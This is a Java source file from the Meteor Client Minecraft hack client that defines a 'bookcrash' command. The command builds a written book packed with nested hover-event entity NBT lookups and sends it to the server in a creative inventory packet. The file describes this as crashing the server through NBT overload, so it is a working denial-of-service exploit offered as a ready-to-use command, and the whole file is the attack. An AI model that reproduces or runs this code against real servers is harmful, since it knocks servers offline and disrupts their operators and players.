/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client/).
 * Copyright (c) 2021 Meteor Development.
 */

package meteordevelopment.meteorclient.systems.commands.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class BookCrashCommand extends Command {
    public BookCrashCommand() {
        super("bookcrash", "Crashes the server via NBT overload.", "bc");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
            final String playername = mc.player.getDisplayName().asString();
            NbtCompound nbtCompound = StringNbtReader.parse("{display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Open book to make\"}],\"text\":\"\"}','{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Server runs out of memory\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"magenta\",\"text\":\"Book Crash\"}],\"text\":\"\"}'},title:\"\",author:\"\",pages:['{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}']}");
            crash.setNbt(nbtCompound);
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(-106, crash));
            sendToast("Book Crash", "Book Created");
            return SINGLE_SUCCESS;
        });
    }
}
